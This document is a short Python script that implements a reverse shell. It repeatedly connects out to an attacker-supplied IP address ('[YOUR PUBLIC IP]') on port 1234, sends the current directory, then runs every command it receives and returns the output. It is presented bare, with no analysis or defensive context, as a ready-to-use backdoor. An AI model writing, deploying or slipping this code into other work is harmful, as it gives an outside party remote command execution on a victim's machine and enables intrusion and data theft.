import socket
import subprocess
import time
import os
import shlex



socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


ip  = "[YOUR PUBLIC IP]"


while True:
    try:
        socket.connect((ip,1234))
        break
    except:
        continue

        
cwd = subprocess.run("pwd" , capture_output = True)




socket.send(cwd.stdout)


while True:
    command = socket.recv(1024)
    command = command.decode()

    command = shlex.split(command)


    try:


        if command[0] == "cd":
            try:
                os.chdir(command[1])

                newcwd = os.getcwd()

                socket.send(newcwd.encode())

            except IndexError:
                os.chdir(cwd.stdout.decode().strip("\n"))

                socket.send(cwd.stdout)

        else:
                

            outstr = subprocess.run(command , capture_output = True)


            if outstr.stdout.decode() != "":


                socket.send(outstr.stdout)

            else:
                socket.send("NOUTPUT".encode())
                

    except FileNotFoundError:
        socket.send("INVALID COMMAND".encode())

        
            
